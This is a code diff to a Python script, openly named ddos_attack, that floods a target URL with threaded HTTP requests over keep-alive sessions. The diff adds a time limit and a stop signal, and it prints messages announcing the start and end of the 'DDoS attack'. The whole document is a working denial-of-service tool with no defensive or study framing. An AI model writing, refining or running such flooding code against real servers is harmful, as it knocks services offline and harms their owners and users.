@@ -1,11 +1,13 @@
 import requests
 import threading
+import time
 
-def ddos_attack(target_url, request_count):
+def ddos_attack(target_url, request_count, duration=30):
+    stop_event = threading.Event()
+
     def send_request():
-        while True:
+        while not stop_event.is_set():
             try:
-                # Using a session with keep-alive for more impact
                 session = requests.Session()
                 session.headers.update({'Connection': 'keep-alive'})
                 response = session.get(target_url, timeout=5)
@@ -19,5 +21,12 @@ def ddos_attack(target_url, request_count):
         thread.start()
         threads.append(thread)
 
+    # Let the attack run for the specified duration (30 seconds)
+    print(f"Starting DDoS attack on {target_url} for {duration} seconds...")
+    time.sleep(duration)
+    stop_event.set()  # Signal all threads to stop after the duration
+
     for thread in threads:
         thread.join()
+
+    print("DDoS attack completed. The server should recover shortly.")
